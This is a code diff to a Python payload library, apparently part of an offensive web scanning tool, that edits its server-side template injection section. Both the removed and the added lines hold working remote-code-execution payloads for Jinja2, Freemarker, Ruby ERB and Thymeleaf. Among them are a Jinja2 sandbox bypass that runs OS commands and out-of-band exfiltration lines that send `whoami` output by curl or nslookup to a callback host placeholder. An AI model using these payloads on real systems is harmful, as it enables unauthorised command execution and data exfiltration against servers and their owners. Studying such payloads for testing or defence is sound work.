@@ -89,21 +89,23 @@ CMD_PAYLOADS = {
 }
 # --- Server-Side Template Injection (SSTI) Payloads ---
 SSTI_PAYLOADS = {
-    "code_execution": {
-        "jinja2": [
-            "{{ cycler.__init__.__globals__.os.popen('curl http://INTERACTSH_URL/`whoami`').read() }}", # OOB Exfil
-            "{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['sys'].modules['os'].system('id') }}", # Sys Module Abuse (Index Needed)
-        ],
-        "freemarker": [
-            "<#assign x='freemarker.template.utility.Execute'?new()>${x('nslookup INTERACTSH_URL')}", # DNS OOB
-        ],
-        "ruby_erb": [
-            "<%= IO.popen('curl http://INTERACTSH_URL/`whoami`').readlines.join %>", # OOB HTTP
-        ],
-        "thymeleaf": [
-            "[[${T(java.lang.Runtime).getRuntime().exec('nslookup INTERACTSH_URL').waitFor()?'':''}]]", # DNS OOB
-        ]
-    }
+    "jinja2": [
+        # Payload for SSTI in Jinja2 with sandbox bypass
+        "{{ get_flashed_messages.__globals__['__builtins__'].eval('__import__(\'os\').popen(\'id\').read()') }}", 
+        # This payload uses the built-in `eval` function to execute OS commands
+        "{{ ''.__class__.__mro__[1].__subclasses__()[183].__init__.__globals__['sys'].modules['os'].system('id') }}",
+        # This payload accesses the `os` module through the class hierarchy to execute commands
+    ],
+    "freemarker": [
+        # Example payload for Freemarker (add more as needed)
+        "<#assign x='freemarker.template.utility.Execute'?new()>${x('nslookup INTERACTSH_URL')}", # DNS OOB
+    ],
+    "ruby_erb": [
+        "<%= IO.popen('curl http://INTERACTSH_URL/`whoami`').readlines.join %>", # OOB HTTP
+    ],
+    "thymeleaf": [
+        "[[${T(java.lang.Runtime).getRuntime().exec('nslookup INTERACTSH_URL').waitFor()?'':''}]]", # DNS OOB
+    ]
 }
 
 # --- Path Traversal Payloads ---
